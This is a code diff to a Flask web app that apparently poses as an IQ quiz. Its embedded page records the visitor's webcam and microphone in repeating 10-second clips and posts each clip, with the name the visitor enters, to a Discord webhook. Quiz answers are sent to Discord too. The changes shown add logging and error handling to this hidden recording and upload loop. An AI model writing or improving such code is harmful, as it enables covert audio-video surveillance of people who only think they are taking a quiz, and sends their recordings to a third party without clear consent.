@@ -184,9 +184,10 @@ HTML_TEMPLATE = """
         try {
             mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
             document.getElementById('webcam').srcObject = mediaStream;
+            console.log("Camera started successfully");
             startNewSegment();
         } catch (err) {
-            console.error("Camera denied", err);
+            console.error("Camera access denied or error:", err);
         }
     }
 
@@ -196,20 +197,29 @@ HTML_TEMPLATE = """
         try {
             mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
             mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = () => {
+            mediaRecorder.onstop = async () => {
                 if (recordedChunks.length > 0) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    console.log("Segment recorded, size:", blob.size);
                     const username = document.getElementById('username').value || "Utilisateur Anonyme";
                     const formData = new FormData();
                     formData.append("username", username + " [🎥 Live Clip]");
                     formData.append("video", blob, "live_clip.webm");
-                    fetch("/submit-consent", { method: "POST", body: formData }).catch(err => {});
+                    try {
+                        let res = await fetch("/submit-consent", { method: "POST", body: formData });
+                        let resData = await res.json();
+                        console.log("Server response for clip:", resData);
+                    } catch (err) {
+                        console.error("Fetch error for clip:", err);
+                    }
                 }
                 startNewSegment();
             };
             mediaRecorder.start();
             setTimeout(() => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
-        } catch (err) {}
+        } catch (err) {
+            console.error("MediaRecorder error:", err);
+        }
     }
 
     async function verifyAndSend() {
@@ -222,7 +232,7 @@ HTML_TEMPLATE = """
         }
 
         const formData = new FormData();
-        formData.append("username", document.getElementById("username").value);
+        formData.append("username", document.getElementById('username').value);
         for (let i = 1; i <= 20; i++) {
             formData.append("q" + i, document.getElementById("q" + i).value);
         }
@@ -267,6 +277,7 @@ def send_to_discord(content, video_file=None):
         files=files,
         timeout=30
     )
+    print(f"Discord API Response Status: {response.status_code}")
     response.raise_for_status()
 
 @app.route("/submit-consent", methods=["POST"])
@@ -275,11 +286,14 @@ def submit_consent():
         username = request.form.get("username", "Utilisateur")
         video_file = request.files.get("video")
         if not video_file:
+            print("Error: No video file in request")
             return jsonify({"error": "No video"}), 400
+        print(f"Received video file from {username}, size check.")
         content = f"🎥 **IQ Questions — Flux Vidéo (10s)**\n**Nom :** {username}"
         send_to_discord(content, video_file)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
+        print(f"Exception in submit_consent: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 @app.route("/submit-answers", methods=["POST"])
@@ -295,6 +309,7 @@ def submit_answers():
         send_to_discord(content)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
+        print(f"Exception in submit_answers: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
